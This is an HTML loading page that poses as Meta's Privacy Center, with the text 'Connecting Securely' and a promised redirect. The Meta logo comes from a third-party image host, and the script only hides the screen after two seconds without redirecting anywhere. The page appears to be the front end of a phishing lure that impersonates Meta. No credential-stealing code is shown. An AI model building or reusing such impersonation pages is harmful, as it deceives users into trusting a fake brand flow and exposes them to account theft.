<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Privacy Center</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    /* Loading Screen Styles */
    #loadingScreen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #f4f6f8;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 100000;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      color: #1c1e21;
    }

    .loading-container {
      background: #ffffff;
      padding: 42px 40px;
      border-radius: 12px;
      width: 380px;
      text-align: center;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.08);
    }

    .loading-logo {
      margin-bottom: 22px;
    }

    .loading-logo img {
      height: 40px;
      max-width: 100%;
    }

    .loading-container h2 {
      font-size: 20px;
      font-weight: 600;
      margin: 12px 0;
    }

    .loading-container p {
      font-size: 14px;
      line-height: 1.6;
      color: #606770;
      margin: 0;
    }

    .loader {
      margin: 28px auto 0;
      width: 38px;
      height: 38px;
      border: 3px solid #e4e6eb;
      border-top: 3px solid #1877f2;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-note {
      margin-top: 22px;
      font-size: 12px;
      color: #8a8d91;
    }

    .loading-footer {
      margin-top: 14px;
      font-size: 11px;
      color: #a0a3a8;
    }
  </style>
</head>
<body>
  <!-- Loading Screen -->
  <div id="loadingScreen">
    <div class="loading-container">
      <!-- Original Blue Meta Logo (Base64) -->
      <div class="loading-logo">
        <img src="https://ik.imagekit.io/7ekqgt7ca/images%20(3).jpeg" alt="Meta Platforms logo">
      </div>

      <h2>Connecting Securely</h2>

      <p>
        Please wait while we redirect you to the Meta Privacy Center to continue.
      </p>

      <div class="loader"></div>

      <div class="loading-note">
        This process may take a few seconds.
      </div>

      <div class="loading-footer">
        Meta is a trademark of Meta Platforms, Inc.
      </div>
    </div>
  </div>

  <script>
    // Optional: Add JavaScript to hide loading screen after a delay
    setTimeout(() => {
      document.getElementById('loadingScreen').style.display = 'none';
      // Your code to show main content here
    }, 2000); // 2 seconds
  </script>
</body>
</html>
